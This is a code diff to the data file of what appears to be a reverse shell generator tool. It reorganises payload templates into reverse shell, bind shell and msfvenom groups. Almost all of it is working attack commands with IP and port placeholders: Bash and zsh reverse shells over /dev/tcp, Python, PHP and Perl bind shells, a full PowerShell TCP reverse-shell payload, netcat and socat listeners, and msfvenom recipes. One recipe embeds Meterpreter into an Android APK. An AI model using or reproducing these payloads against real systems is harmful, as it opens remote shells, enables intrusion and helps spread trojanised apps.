@@ -1,24 +1,25 @@
-const rsgData = {
+const CommandType = {
+    'ReverseShell': 'ReverseShell',
+    'BindShell': 'BindShell',
+    'MSFVenom': 'MSFVenom'
+};
 
-    listenerCommands: [
-        ['nc', 'nc -lvnp {port}'],
-        ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
-        ['pwncat', 'python3 -m pwncat -lp {port}'],
-        ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
-        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
-        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
-        ['powercat', 'powercat -l -p {port}']
-    ],
+const withCommandType = function (commandType, elements) {
+    return elements.map((element) => {
+        return {
+            ...element,
+            meta: [
+                ...element.meta,
+                commandType
+            ]
+        }
+    });
+}
 
-    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
-
-    upgrade: ['python', ],
-
-    specialCommands: {
-        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-    },
-
-    reverseShellCommands: [{
+const reverseShellCommands = withCommandType(
+    CommandType.ReverseShell,
+    [
+        {
             "name": "Bash -i",
             "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
             "meta": ["linux", "mac"]
@@ -228,97 +229,121 @@ const rsgData = {
             "name": "zsh",
             "command": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
             "meta": ["linux", "mac"]
+        }
+    ]
+);
+
+const bindShellCommands =  withCommandType(
+    CommandType.BindShell,
+    [
+        {
+            "name": "Python3 Bind",
+            "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
+            "meta": ["bind", "mac", "linux", "windows"]
         },
+        {
+            "name": "PHP Bind",
+            "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\socket_write($cl,$m,strlen($m));}}'",
+            "meta": ["bind", "mac", "linux", "windows"]
+        }
+    ]
+);
+
+const msfvenomCommands =  withCommandType(
+    CommandType.MSFVenom,
+    [
+        {
+            "name": "Windows Meterpreter Staged Reverse TCP",
+            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
+            "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
+        },
+        {
+            "name": "Windows Stageless Reverse TCP",
+            "command": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
+            "meta": ["msfvenom", "windows", "stageless", "reverse"]
+        },
+        {
+            "name": "Linux Meterpreter Staged Reverse TCP",
+            "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf",
+            "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
+        },
+        {
+            "name": "Linux Stageless Reverse TCP",
+            "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf",
+            "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
+        },
+        {
+            "name": "Linux Meterpreter Staged Reverse TCP (x86)",
+            "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
+            "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
+        },
+        {
+            "name": "macOS Stageless Reverse TCP (x86)",
+            "command": "msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho > shell.macho",
+            "meta": ["msfvenom", "mac", "stageless", "reverse"]
+        },
+        {
+            "name": "PHP Meterpreter Stageless Reverse TCP",
+            "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php",
+            "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
+        },
+        {
+            "name": "JSP Stageless Reverse TCP",
+            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp",
+            "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
+        },
+        {
+            "name": "WAR Stageless Reverse TCP",
+            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",
+            "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
+        },
+        {
+            "name": "Android Meterpreter Reverse TCP",
+            "command": "msfvenom –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > payload-name.apk",
+            "meta": ["msfvenom", "android", "android", "reverse"]
+        },
+        {
+
+            "name": "Android Meterpreter Embed Reverse TCP",
+            "command": "msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
+            "meta": ["msfvenom", "android", "android", "reverse"]
+        },
+        {
+            "name": "Python Stageless Reverse TCP",
+            "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw > shell.py",
+            "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
+        },
+        {
+            "name": "Bash Stageless Reverse TCP",
+            "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw > shell.sh",
+            "meta": ["msfvenom", "linux", "macos", "stageless", "reverse"]
+        },
+    ]
+);
+
+const rsgData = {
+
+    listenerCommands: [
+        ['nc', 'nc -lvnp {port}'],
+        ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
+        ['pwncat', 'python3 -m pwncat -lp {port}'],
+        ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
+        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
+        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
+        ['powercat', 'powercat -l -p {port}']
     ],
 
-    bindShellCommands: [{
-        "name": "Perl Bind",
-        "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};'",
-        "meta": ["bind"]
-    },
-    {
-        "name": "Python3 Bind",
-        "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
-        "meta": ["bind"]
-    },
-    {
-    "name": "PHP Bind",
-    "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\socket_write($cl,$m,strlen($m));}}'",
-    "meta": ["bind"]
-    },
-],
+    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
 
-    msfvenomShellCommands: [{
-        "name": "Windows Meterpreter Staged Reverse TCP",
-        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
-        "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
-    },
-    {
-        "name": "Windows Stageless Reverse TCP",
-        "command": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > reverse.exe",
-        "meta": ["msfvenom", "windows", "stageless", "reverse"]
-    },
-    {
-        "name": "Linux Meterpreter Staged Reverse TCP",
-        "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf",
-        "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
-    },
-    {
-        "name": "Linux Stageless Reverse TCP",
-        "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf",
-        "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
-    },
-    {
-        "name": "Linux Meterpreter Staged Reverse TCP (x86)",
-        "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
-        "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
-    },
-    {
-        "name": "macOS Stageless Reverse TCP (x86)",
-        "command": "msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho > shell.macho",
-        "meta": ["msfvenom", "mac", "stageless", "reverse"]
-    },
-    {
-        "name": "PHP Meterpreter Stageless Reverse TCP",
-        "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php",
-        "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
-    },
-    {
-        "name": "JSP Stageless Reverse TCP",
-        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp",
-        "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
-    },
-    {
-        "name": "WAR Stageless Reverse TCP",
-        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",
-        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
-    },
-    {
-        "name": "Android Meterpreter Reverse TCP",
-        "command": "msfvenom –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > payload-name.apk",
-        "meta": ["msfvenom", "android", "android", "reverse"]
-    },
-    {
+    upgrade: ['python', ],
 
-        "name": "Android Meterpreter Embed Reverse TCP",
-        "command": "msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
-        "meta": ["msfvenom", "android", "android", "reverse"]
+    specialCommands: {
+        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
     },
-    {
-        "name": "Python Stageless Reverse TCP",
-        "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw > shell.py",
-        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
-    },
-    {
-        "name": "Bash Stageless Reverse TCP",
-        "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw > shell.sh",
-        "meta": ["msfvenom", "linux", "macos", "stageless", "reverse"]
-    },
-    {
-        "name": "Perl Stageless Reverse TCP",
-        "command": "msfvenom -p cmd/unix/reverse_perl LHOST={ip} LPORT={port} -f raw > shell.pl",
-        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
-    },
-],
 
+    reverseShellCommands: [
+        ...reverseShellCommands,
+        ...bindShellCommands,
+        ...msfvenomCommands
+    ]
 }
